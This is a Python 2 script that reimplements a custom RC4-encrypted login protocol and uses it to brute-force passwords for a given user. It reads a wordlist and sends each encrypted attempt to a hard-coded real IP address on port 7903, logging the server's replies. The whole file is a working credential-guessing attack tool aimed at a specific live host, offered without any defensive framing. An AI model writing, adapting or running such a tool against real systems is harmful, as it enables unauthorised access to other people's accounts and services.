import socket
import base64
import sys
import binascii
import struct

RC4KEY_USER = ''
RC4KEY_PASSW = ''
MAGIC_NUM_LITTLE = ''
MAGIC_NUM_BIG = ''

def setKeys(packet):
    global RC4KEY_USER
    global RC4KEY_PASSW
    global MAGIC_NUM_LITTLE
    global MAGIC_NUM_BIG
    r1 = int((packet[2]+packet[1]).encode('hex'), 16) ^ int(packet[3].encode('hex'), 16)
    r2 = r1 ^ int((packet[5]+packet[4]).encode('hex'),16)
    r3 = r2 ^ int(packet[3].encode('hex'), 16)
    RC4KEY_PASSW = str(r3) + str('7903')
    RC4KEY_USER = str(r3) + str('107')
    print '0x{:02x}'.format(r3)
    MAGIC_NUM_BIG = struct.pack("<H", r3)
    MAGIC_NUM_LITTLE = struct.pack(">H",r3)
    print 'RC4KEY_PASSW ' + RC4KEY_PASSW
    print 'RC4KEY_USER ' + RC4KEY_USER

def RC4_crypt(data, key):
    S = list(range(256))
    j = 0

    for i in list(range(256)):
        j = (j + S[i] + ord(key[i % len(key)])) % 256
        S[i], S[j] = S[j], S[i]

    j = 0
    y = 0
    out = []

    for char in data:
        j = (j + 1) % 256
        y = (y + S[j]) % 256
        S[j], S[y] = S[y], S[j]
        out.append(chr(ord(char) ^ S[(S[j] + S[y]) % 256]))
    #print str(len(''.join(out)))
    #for c in out:
      #print c
      #print c.encode('hex')
    return ''.join(out)
    #return out.tostring()

def to_hex(t, nbytes):
    "Format text t as a sequence of nbyte long values separated by spaces."
    chars_per_item = nbytes * 2
    hex_version = binascii.hexlify(t)
    num_chunks = len(hex_version) / chars_per_item
    def chunkify():
        for start in xrange(0, len(hex_version), chars_per_item):
            yield hex_version[start:start + chars_per_item]
    return ' '.join(chunkify())

def getCount():
  print RC4_crypt(b'\x02',MAGIC_NUM_BIG).encode('hex')
  return RC4_crypt(b'\x02',MAGIC_NUM_BIG)

def getMagic():
  #print MAGIC_NUM_LITTLE
  result = 0x0662eb2d - int(MAGIC_NUM_LITTLE.encode('hex'),16)
  return struct.pack("<i", result)

def craftPacket(user, passw):
  count = getCount()
  getMagic()
  magicIpAddress = getMagic()
  firstStruct = b"\x01\x00" + count + b"\xb9\x00" + magicIpAddress + b"\x01\x40\x31\x39\x44\x34\x30\x34\x35\x30\x41\x43\x34\x38\x34\x33\x45\x42\x38\x41\x38\x46\x45\x46\x32\x37\x37\x42\x33\x37\x41\x43\x39\x37\x32\x38\x37\x44\x41\x39\x31\x38\x45\x35\x30\x34\x43\x45\x45\x42\x30\x43\x32\x38\x34\x35\x34\x34\x42\x30\x31\x41\x37\x33\x41\x39"
  packet = firstStruct + base64.b64encode(user) + base64.b64encode(passw)
  #print "".join("{:02x}".format((c)) for c in passw)
  #print "".join("{:02x}".format((c)) for c in user)
  print to_hex(packet,1)
  print packet
  return packet

def sendLogin(user, password):
  serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  serverSock.connect(("45.235.98.6", 7903)) 
  firstPacket = serverSock.recv(4096)
  setKeys(firstPacket)
  userPadded = "{:<50}".format(user)
  passwPadded = "{:<32}".format(password)

  userCrypt = RC4_crypt(userPadded, RC4KEY_USER)
  passwCrypt = RC4_crypt(passwPadded, RC4KEY_PASSW)
  print str(len(userCrypt))
  print str(len(passwCrypt))
  login = craftPacket(userCrypt, passwCrypt)
  serverSock.send(login)
  loginResponse = serverSock.recv(4096)
  print loginResponse.encode('hex')
  print user + ":" + password + " > " + loginResponse.encode('hex')[2:]

def main():
  user = sys.argv[1]
  print '[*] Starting bruteforce on user ' + user
  fileName = sys.argv[2]
  with open(fileName, 'r') as file:
    allPasswords = file.read().splitlines()
    for password in allPasswords:
      sendLogin(user, password)



if __name__ == '__main__':
    main()
